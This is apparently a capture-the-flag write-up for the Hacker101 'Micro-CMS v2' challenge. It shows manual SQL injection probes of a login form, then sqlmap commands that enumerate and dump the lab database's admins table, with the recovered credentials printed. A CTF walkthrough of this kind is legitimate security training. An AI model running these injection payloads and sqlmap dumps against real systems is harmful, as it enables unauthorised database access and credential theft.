## Micro-CMS v2 - Hacker101 CTF - Web (moderate)

#### Initial recon

The page is very barebones, however there are two options that we can navigate to that will be the primary attack surface: Creating a new page, and editing a page. Either one of these directs us to a login prompt.

![login](https://github.com/user-attachments/assets/ecf835eb-535c-4d2d-bcc2-6385fc8ac311)

#### Login Page Injection

I send a login request and capture it with burpsuite to get a better look. The login function sends a POST request with parameters: username and password. From here I can test for injection vulnerabilities.

Testing for SQLi:

Simply entering ' for the username produces an error in the page:

![intServerError](https://github.com/user-attachments/assets/2b5edfad-2d54-41fd-adfd-b2ae11438203)

But entering '; for the username just gives me an unknown user response. Therefore I am likely dealing with a SQL database.

For example, the username code could be "username = '<SOME INPUT>'" where <SOME INPUT> is what we enter. When we enter single apostrophe the effective result becomes "username = '''" which is invalid code. However, when we use ';, the ; ends the line of code: "username='';'" so the apostrophe after the semicolon is voided out making it legitimate code hence the normal unknown user response.

From here, I try "test' or 1=1;" as my input and this time the page tells us "invalid password". Trying out to comment the remaining line of SQL to ignore the password doesn't work. There is likely a separated SQL line for password checking, to ensure that a user is matched to its password.

#### SQLMAP

I will make use of sqlmap to make a more comprehensive attack into this SQLi vulnerability.

```
sqlmap -u "https://1b2e944ae31eb228af9fbc71fdeb9e9c.ctf.hacker101.com/login" --data="username=admin&password=test" -p username,password --level=5 --risk=3
```

The results of this sqlmap tell me that the backend database type is MySQL so I cancel this run and rerun SQLmap to save time:

```
sqlmap -u "https://ed680846e3ecdfe2bdfdc9f9c2b8a9db.ctf.hacker101.com/login" --data="username=test&password=some" --batch --dbms=mysql --dbs --level=3 --risk=2
```

The above command enumerated 4 databases:

```
[13:11:23] [INFO] retrieved: 4
[13:11:26] [INFO] retrieved: information_schema
[13:12:25] [INFO] retrieved: performance_schema
[13:13:21] [INFO] retrieved: mysql
[13:13:40] [INFO] retrieved: level2
available databases [4]:
[*] information_schema
[*] level2
[*] mysql
[*] performance_schema
```

I will continue using sqlmap to further enumerate the MySQL database.

```
sqlmap -u "https://ed680846e3ecdfe2bdfdc9f9c2b8a9db.ctf.hacker101.com/login" --data="username=test&password=some" --dbms=mysql -D level2 --tables --columns --level=3 --risk=2 --threads=8
```

The results of the above command tell me there are two tables in the "level2" database: "admins" and "pages". Then sqlmap continues to find the column names for each of these tables:

```
Database: level2
Table: pages
[4 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| body   | mediumtext   |
| id     | int(11)      |
| public | tinyint(1)   |
| title  | varchar(256) |
+--------+--------------+

Database: level2
Table: admins
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(256) |
| username | varchar(256) |
+----------+--------------+

```

From here, what we are interested in is the password and username columns for the admins table in the level2 database. To dump the data from this table, use the following sqlmap:

```
sqlmap -u "https://ed680846e3ecdfe2bdfdc9f9c2b8a9db.ctf.hacker101.com/login" --data="username=test&password=some" --dbms=mysql -D level2 -T admins -C id,password,username --dump --level=3 --risk=2 --threads=8
```

And like magic, the results:

```
Database: level2
Table: admins
[1 entry]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | crista   | amber    |
+----+----------+----------+
```

After logging in, the flag shows up.

#### Resources

https://sqlmap.org/

